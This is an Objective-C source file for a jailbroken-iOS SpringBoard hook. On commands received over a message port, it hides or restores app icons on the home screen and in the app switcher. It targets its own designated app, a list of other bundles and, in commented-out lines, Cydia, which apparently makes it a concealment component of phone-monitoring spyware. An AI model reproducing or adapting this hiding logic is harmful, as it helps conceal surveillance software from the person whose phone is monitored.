//
//  VisibilityNotifier.m
//  MSFSP
//
//  Created by Makara Khloth on 5/30/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "VisibilityNotifier.h"
#import "DefStd.h"
#import "Visibility.h"

#import "SBAppSwitcherModel.h"
#import "SBIconModel.h"
#import "SBApplicationController.h"
#import "SBApplication.h"
#import "SBIconController.h"

#import "SBIconModel+IOS6.h"

#include <objc/runtime.h>

static VisibilityNotifier *_visibilityNotifier = nil;

@implementation VisibilityNotifier

+ (id) shareVisibilityNotifier {
	if (_visibilityNotifier == nil) {
		_visibilityNotifier = [[VisibilityNotifier alloc] init];
	}
	return (_visibilityNotifier);
}

- (id) init {
	if ((self = [super init])) {
		mMessagePort = [[MessagePortIPCReader alloc] initWithPortName:kAppVisibilityMessagePort
										   withMessagePortIPCDelegate:self];
		[mMessagePort start];
	}
	return (self);
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	DLog(@"VisibilityNotifier ========> dataDidReceivedFromMessagePort: aRawData = %@", aRawData);
	Visibility* vis = [[[Visibility alloc] init] autorelease];
	
	DLog (@"mHideDesktopIcon = %d", [vis mHideDesktopIcon]);
	DLog (@"mHideAppSwitcherIcon = %d", [vis mHideAppSwitcherIcon]);
	DLog (@"mBundleID = %@", [vis mBundleID]);
	DLog (@"mBundleName = %@", [vis mBundleName]);
	DLog (@"mHiddenBundleIdentifiers = %@", [vis mHiddenBundleIdentifiers]);
	DLog (@"mShownBundleIdentifiers = %@", [vis mShownBundleIdentifiers]);
	
	Class $SBApplicationController = objc_getClass("SBApplicationController");
	SBApplicationController *sbApplicationController = [$SBApplicationController sharedInstance];
	
	NSArray *applications = nil;
//	applications = [sbApplicationController applicationsWithBundleIdentifier:kCYDIAIDENTIFIER];
//	SBApplication *cydia = [applications count] ? [applications objectAtIndex:0] : nil;
	applications = [sbApplicationController applicationsWithBundleIdentifier:vis.mBundleID];
	SBApplication *ssmp = [applications count] ? [applications objectAtIndex:0] : nil;
	
	Class $SBIconModel = objc_getClass("SBIconModel");
	Class $SBAppSwitcherModel = objc_getClass("SBAppSwitcherModel");
	
	SBAppSwitcherModel *sbAppSwitcherModel = [$SBAppSwitcherModel sharedInstance];
	
	SEL layoutSelector = nil;
	SEL clearSelector = nil;
	SBIconModel *sbIconModel = nil;
	if ([$SBIconModel respondsToSelector:@selector(sharedInstance)]) {
		sbIconModel = [$SBIconModel sharedInstance];
		layoutSelector = @selector(relayout);
		clearSelector = @selector(clearCachedUserGeneratedIconState); // Not exist in iOS 6
		//[sbIconModel clearCachedUserGeneratedIconStateIfPossible]; // Not exist for iOS 4.2.1 (tested)
	} else {
		// From IOS 6 onward there is no class method sharedInstance in SBIconModel thus get from SBIconController's
		// instance variable
		Class $SBIconController = objc_getClass("SBIconController");
		SBIconController *sbIconController = [$SBIconController sharedInstance];
		object_getInstanceVariable(sbIconController, "_iconModel", (void **)&sbIconModel);
		layoutSelector = @selector(layout);
		clearSelector = @selector(clearDesiredIconStateIfPossible);
	}

	// ssmp
	if (![vis mHideDesktopIcon]) {
//		[sbIconModel addIconForApplication:cydia];
		[sbIconModel addIconForApplication:ssmp];
		[sbIconModel performSelector:layoutSelector];
		
//		[sbAppSwitcherModel addToFront:kCYDIAIDENTIFIER];
		[sbAppSwitcherModel addToFront:vis.mBundleID];
		// addToFront intern will call _saveRecents
	} else {
//		[sbIconModel removeIconForIdentifier:[cydia bundleIdentifier]];
		[sbIconModel removeIconForIdentifier:[ssmp bundleIdentifier]];
		[sbIconModel performSelector:clearSelector];
		[sbIconModel performSelector:layoutSelector];
		
//		[sbAppSwitcherModel remove:kCYDIAIDENTIFIER];
		[sbAppSwitcherModel remove:vis.mBundleID];
		[sbAppSwitcherModel _saveRecents];
	}
	
	// Hidden list
	for (NSString *bundleIdentifier in [vis mHiddenBundleIdentifiers]) {
		// SpringBoard
		[sbIconModel removeIconForIdentifier:bundleIdentifier];
		[sbIconModel performSelector:clearSelector];
		[sbIconModel performSelector:layoutSelector];
		
		// AppSwitcher
		[sbAppSwitcherModel remove:bundleIdentifier];
		[sbAppSwitcherModel _saveRecents];
	}
	
	// Shown list
	for (NSString *bundleIdentifier in [vis mShownBundleIdentifiers]) {
		// SpringBoard
		applications = [sbApplicationController applicationsWithBundleIdentifier:bundleIdentifier];
		SBApplication *sbApplication = [applications count] ? [applications objectAtIndex:0] : nil;
		[sbIconModel addIconForApplication:sbApplication];
		[sbIconModel performSelector:layoutSelector];
		
		// AppSwitcher
		[sbAppSwitcherModel addToFront:bundleIdentifier];
	}
	
	DLog (@"DONE===>");
}

- (void) dealloc {
	[mMessagePort release];
	[super dealloc];
}

@end
